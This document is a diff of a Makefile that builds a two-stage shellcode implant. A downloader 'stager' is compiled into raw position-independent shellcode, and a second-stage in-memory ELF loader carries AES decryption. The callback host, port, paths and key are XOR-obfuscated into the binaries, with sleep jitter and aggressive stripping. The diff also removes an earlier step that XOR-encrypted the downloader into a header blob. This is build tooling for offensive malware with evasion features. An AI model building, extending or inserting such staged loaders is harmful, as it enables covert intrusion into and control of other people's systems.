@@ -1,20 +1,19 @@
 CC = gcc
-# Add -ffunction-sections -fdata-sections
-CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. \
-         -fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
-         -fno-asynchronous-unwind-tables -fvisibility=hidden
+COMMON_CFLAGS = -Wall -Wextra -Os -fno-builtin -fno-stack-protector -fPIC -nostdlib -I. \
+				-fno-toplevel-reorder -s -fno-ident -ffunction-sections -fdata-sections \
+				-fno-asynchronous-unwind-tables -fvisibility=hidden
 
 # Debug support
 ifdef DEBUG
-CFLAGS += -DDEBUG
+COMMON_CFLAGS += -DDEBUG
 endif
 
 # Common linker flags
 LDFLAGS_COMMON = -static -Wl,--gc-sections -Wl,-N -Wl,--build-id=none
 
 # Specific linker flags
-LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
-DL_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0
+STAGE0_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x10000000
+STAGE1_LDFLAGS = $(LDFLAGS_COMMON) -Wl,-Ttext-segment=0x0
 
 # Default configuration (can be overridden by environment variables)
 DOWNLOAD_HOST ?= 127.0.0.1
@@ -39,61 +38,78 @@ XOR_MODULE_PATH := $(shell python3 -c "s='$(MODULE_PATH)'; k=$(XOR_KEY_VALUE); p
 XOR_LIB_PATH := $(shell python3 -c "s='$(DOWNLOADER_MODULE_PATH)'; k=$(XOR_KEY_VALUE); print(','.join(hex(ord(c)^k) for c in s) + ',0x00' if s else '0x00')")
 
 # Define listener type
-CFLAGS += -DLISTENER_$(LISTENER_TYPE)
+COMMON_CFLAGS += -DLISTENER_$(LISTENER_TYPE)
 
 # Config options
-CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
-CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
-CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
-CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
-CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
-CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
-CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
-CFLAGS += -DSLEEP_MIN=$(SLEEP_MIN)
-CFLAGS += -DSLEEP_MAX=$(SLEEP_MAX)
+COMMON_CFLAGS += -DENCODED_HOST="$(XOR_HOST)"
+COMMON_CFLAGS += -DENCODED_PORT="$(XOR_PORT)"
+COMMON_CFLAGS += -DENCODED_PATH="$(XOR_PATH)"
+COMMON_CFLAGS += -DENCODED_KEY="$(XOR_KEY)"
+COMMON_CFLAGS += -DENCODED_MODULE_PATH="$(XOR_MODULE_PATH)"
+COMMON_CFLAGS += -DENCODED_LIB_PATH="$(XOR_LIB_PATH)"
+COMMON_CFLAGS += -DCONFIG_XOR_KEY=$(XOR_KEY_VALUE)
+COMMON_CFLAGS += -DSLEEP_MIN=$(SLEEP_MIN)
+COMMON_CFLAGS += -DSLEEP_MAX=$(SLEEP_MAX)
 
-DL_SRCS = downloader.c net_utils.c aes.c tinflate.c utils.c
-STUB_SRCS = stub.c elf_loader.c utils.c
+STAGE0_SRCS = downloader.c net_utils.c utils_min.c
+STAGE1_SRCS = stub.c elf_loader.c aes.c tinflate.c utils.c
 
-DL_TARGET = downloader
-DL_BIN = downloader.bin
-DL_BLOB_H = downloader_blob.h
+STAGE0_TARGET = stager
+STAGE1_TARGET = loader
+STAGE1_PRE_TARGET = loader.pre
+STAGE1_PRE_BIN = loader.pre.bin
+STAGE1_BIN = loader.bin
+STAGE1_SIZE_H = stage1_size.h
 
-TARGET = stager
 SHELLCODE = stager.bin
 
 .PHONY: all clean
 
-all: $(SHELLCODE)
+all: $(SHELLCODE) $(STAGE1_BIN) verify_loader_pic
 
-$(DL_TARGET): $(DL_SRCS)
-	$(CC) $(CFLAGS) $(DL_LDFLAGS) -o $@ $(DL_SRCS)
+$(STAGE1_PRE_TARGET): $(STAGE1_SRCS)
+	$(CC) $(COMMON_CFLAGS) -DSTAGE1_SIZE=0 $(STAGE1_LDFLAGS) -o $@ $(STAGE1_SRCS)
 
-$(DL_BIN): $(DL_TARGET)
+$(STAGE1_PRE_BIN): $(STAGE1_PRE_TARGET)
 	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $<
 	objcopy -O binary -j .init -j .text -j .rodata -j .data $< $@
 
-$(DL_BLOB_H): $(DL_BIN)
-	@echo "Generating encrypted blob header..."
-	@python3 -c "import os, random; \
-	key = [random.randint(0, 255) for _ in range(16)]; \
-	data = open('$(DL_BIN)', 'rb').read(); \
-	enc_data = bytes([b ^ key[i % 16] for i, b in enumerate(data)]); \
-	print('#ifndef DOWNLOADER_BLOB_H'); \
-	print('#define DOWNLOADER_BLOB_H'); \
-	print('static const unsigned char downloader_key[] = { ' + ', '.join(hex(b) for b in key) + ' };'); \
-	print('static const unsigned int downloader_bin_len = ' + str(len(data)) + ';'); \
-	print('static const unsigned char downloader_bin[] = { ' + ', '.join(hex(b) for b in enc_data) + ' };'); \
-	print('#endif')" > $@
+$(STAGE1_SIZE_H): $(STAGE1_PRE_BIN)
+	@echo "#ifndef STAGE1_SIZE_H" > $@
+	@echo "#define STAGE1_SIZE_H" >> $@
+	@echo "#define STAGE1_SIZE $$(wc -c < $(STAGE1_PRE_BIN))" >> $@
+	@echo "#endif" >> $@
 
-$(TARGET): $(STUB_SRCS) $(DL_BLOB_H)
-	$(CC) $(CFLAGS) $(LDFLAGS) -o $@ $(STUB_SRCS)
+$(STAGE1_TARGET): $(STAGE1_SRCS) $(STAGE1_SIZE_H)
+	$(CC) $(COMMON_CFLAGS) -include $(STAGE1_SIZE_H) $(STAGE1_LDFLAGS) -o $@ $(STAGE1_SRCS)
 
-$(SHELLCODE): $(TARGET)
-	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(TARGET)
-	objcopy -O binary -j .init -j .text -j .rodata -j .data $(TARGET) $@
+$(STAGE1_BIN): $(STAGE1_TARGET)
+	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE1_TARGET)
+	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE1_TARGET) $@
+	@echo "Stage1 loader generated at $(PWD)/$@"
+	@wc -c $@
+	@final_size=$$(wc -c < $@); hdr_size=$$(awk '/^#define STAGE1_SIZE/{print $$3}' $(STAGE1_SIZE_H)); \
+	if [ "$$final_size" != "$$hdr_size" ]; then \
+		echo "Warning: STAGE1_SIZE ($$hdr_size) does not match final loader.bin size ($$final_size)"; \
+	fi
+
+verify_loader_pic: $(STAGE1_TARGET)
+	@if readelf -r $(STAGE1_TARGET) | grep -Eq 'R_X86_64_(64|32|32S)'; then \
+		echo "Error: absolute relocations detected in $(STAGE1_TARGET)"; \
+		readelf -r $(STAGE1_TARGET); \
+		exit 1; \
+	fi
+
+$(STAGE0_TARGET): $(STAGE0_SRCS)
+	$(CC) $(COMMON_CFLAGS) $(STAGE0_LDFLAGS) -o $@ $(STAGE0_SRCS)
+
+$(SHELLCODE): $(STAGE0_TARGET)
+	strip --strip-all --strip-debug --strip-unneeded -R .comment -R .note -R .note.gnu.build-id $(STAGE0_TARGET)
+	objcopy -O binary -j .init -j .text -j .rodata -j .data $(STAGE0_TARGET) $@
 	@echo "Shellcode generated at $(PWD)/$@"
 	@wc -c $@
 
 clean:
-	rm -f $(TARGET) $(SHELLCODE) $(DL_TARGET) $(DL_BIN) $(DL_BLOB_H)
+	rm -f $(STAGE0_TARGET) $(SHELLCODE) $(STAGE1_TARGET) $(STAGE1_PRE_TARGET) \
+		$(STAGE1_BIN) $(STAGE1_PRE_BIN) $(STAGE1_SIZE_H) \
+		downloader downloader.bin downloader_blob.h *.o
